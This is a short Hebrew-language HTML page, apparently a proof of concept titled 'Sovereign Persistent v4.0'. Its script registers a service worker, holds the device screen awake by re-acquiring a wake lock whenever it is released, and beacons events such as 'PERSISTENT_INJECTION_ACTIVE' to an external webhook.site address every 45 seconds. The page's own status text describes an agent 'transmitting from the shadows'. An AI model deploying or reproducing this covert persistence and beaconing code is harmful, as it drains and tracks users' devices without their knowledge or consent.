<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sovereign Persistent v4.0</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { border: 1px solid #00ff41; padding: 25px; width: 85%; box-shadow: 0 0 35px #004400; text-align: center; }
        .status-line { font-size: 1.1em; margin-bottom: 15px; letter-spacing: 1px; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="status-line">מערכת ינשוף: מצב התמדה פעיל</div>
        <div id="msg" class="blink">מבצע נעילת מעבד (Wake-Lock)...</div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";
        let lock = null;

        async function transmit(data) {
            try {
                await fetch(WEBHOOK, { 
                    method: 'POST', 
                    mode: 'no-cors', 
                    body: JSON.stringify({...data, ts: new Date().toISOString()}) 
                });
            } catch(e) {}
        }

        async function activateWakeLock() {
            if ('wakeLock' in navigator) {
                try {
                    lock = await navigator.wakeLock.request('screen');
                    transmit({ event: "WAKE_LOCK_ENGAGED", status: "SUCCESS" });
                    
                    lock.addEventListener('release', () => {
                        transmit({ event: "WAKE_LOCK_RELEASED", alert: "System attempted sleep" });
                        activateWakeLock(); // ניסיון נעילה מחדש אוטומטי
                    });
                } catch (err) {
                    transmit({ event: "WAKE_LOCK_ERROR", msg: err.message });
                }
            }
        }

        async function init() {
            if ('serviceWorker' in navigator) {
                try {
                    await navigator.serviceWorker.register('sw.js');
                    
                    // הפעלת נעילה מיד עם הטעינה
                    await activateWakeLock();

                    document.getElementById('msg').innerText = "ריבונות נעולה. הסוכן משדר מהצללים.";
                    document.getElementById('msg').classList.remove('blink');
                    
                    transmit({ event: "PERSISTENT_INJECTION_ACTIVE" });

                } catch (error) {
                    transmit({ event: "CRITICAL_FAIL", err: error.message });
                }
            }
        }

        // גיבוי לשידור מהדף עצמו למקרה שהסוכן מורדם
        setInterval(() => {
            transmit({ event: "REDUNDANT_PULSE", mode: "Page-Live" });
        }, 45000);

        window.onload = init;
        
        // ניסיון נעילה מחדש כשהמשתמש חוזר לדף
        document.addEventListener('visibilitychange', () => {
            if (lock !== null && document.visibilityState === 'visible') {
                activateWakeLock();
            }
        });
    </script>
</body>
</html>
